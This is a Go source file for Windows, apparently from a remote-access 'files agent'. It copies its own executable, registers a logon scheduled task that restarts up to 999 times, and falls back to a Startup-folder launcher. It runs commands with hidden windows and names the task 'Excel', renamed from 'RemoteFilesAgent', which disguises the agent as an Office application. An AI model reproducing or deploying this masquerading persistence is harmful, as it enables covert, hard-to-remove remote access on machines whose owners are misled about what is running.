//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	utf16enc "unicode/utf16"
)

const taskName = "Excel"
const oldTaskName = "RemoteFilesAgent"

// ensureInstalled copies the agent to a stable path and registers it to run at
// every logon AND restart itself if it ever stops — so the connection is
// effectively permanent. It prefers a Scheduled Task (which can auto-restart);
// if that fails it falls back to a plain Startup-folder launcher.
func ensureInstalled() error {
	dst := stableExe()
	if _, err := copySelfTo(dst); err != nil {
		return err
	}
	if err := installScheduledTask(dst); err == nil {
		// Task is authoritative; drop any old Startup launcher to avoid double-run.
		runHidden("schtasks", "/Delete", "/TN", oldTaskName, "/F")
		if p, e := startupCmdPath(); e == nil {
			os.Remove(p)
		}
		return nil
	}
	// Fallback: Startup folder launcher (runs at logon, no auto-restart).
	return writeStartupCmd(dst)
}

func removeAutostart() error {
	runHidden("schtasks", "/Delete", "/TN", taskName, "/F")    // ignore errors
	runHidden("schtasks", "/Delete", "/TN", oldTaskName, "/F") // previous name
	if p, err := startupCmdPath(); err == nil {
		os.Remove(p)
	}
	return nil
}

// ---- scheduled task ----

func installScheduledTask(exePath string) error {
	uid := "" // empty = any interactive user; set to current user when known
	if u, err := user.Current(); err == nil {
		uid = u.Username
	}
	xml := buildTaskXML(exePath, uid)

	tmp := filepath.Join(os.TempDir(), taskName+".xml")
	if err := os.WriteFile(tmp, utf16LE(xml), 0o600); err != nil {
		return err
	}
	defer os.Remove(tmp)
	return runHidden("schtasks", "/Create", "/TN", taskName, "/XML", tmp, "/F")
}

func buildTaskXML(exePath, userID string) string {
	trigger := "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>"
	principal := "<Principal id=\"Author\"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal>"
	if userID != "" {
		u := xmlEscape(userID)
		trigger = "<LogonTrigger><Enabled>true</Enabled><UserId>" + u + "</UserId></LogonTrigger>"
		principal = "<Principal id=\"Author\"><UserId>" + u + "</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal>"
	}
	return `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Keeps ` + appName + ` connected.</Description></RegistrationInfo>
  <Triggers>` + trigger + `</Triggers>
  <Principals>` + principal + `</Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>` + xmlEscape(exePath) + `</Command></Exec>
  </Actions>
</Task>`
}

// ---- Startup-folder fallback ----

func startupCmdPath() (string, error) {
	appData, err := os.UserConfigDir() // %APPDATA%
	if err != nil {
		return "", err
	}
	return filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", appName+".cmd"), nil
}

func writeStartupCmd(dst string) error {
	cmdPath, err := startupCmdPath()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(cmdPath), 0o755); err != nil {
		return err
	}
	content := "@echo off\r\nstart \"\" /B \"" + dst + "\"\r\n"
	return os.WriteFile(cmdPath, []byte(content), 0o644)
}

// ---- helpers ----

// runHidden runs a command without flashing a console window.
func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func xmlEscape(s string) string {
	r := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", "\"", "&quot;", "'", "&apos;")
	return r.Replace(s)
}

// utf16LE encodes a string as UTF-16LE with a BOM, which schtasks /XML expects.
func utf16LE(s string) []byte {
	var buf bytes.Buffer
	buf.Write([]byte{0xFF, 0xFE}) // BOM
	for _, u := range utf16enc.Encode([]rune(s)) {
		binary.Write(&buf, binary.LittleEndian, u)
	}
	return buf.Bytes()
}
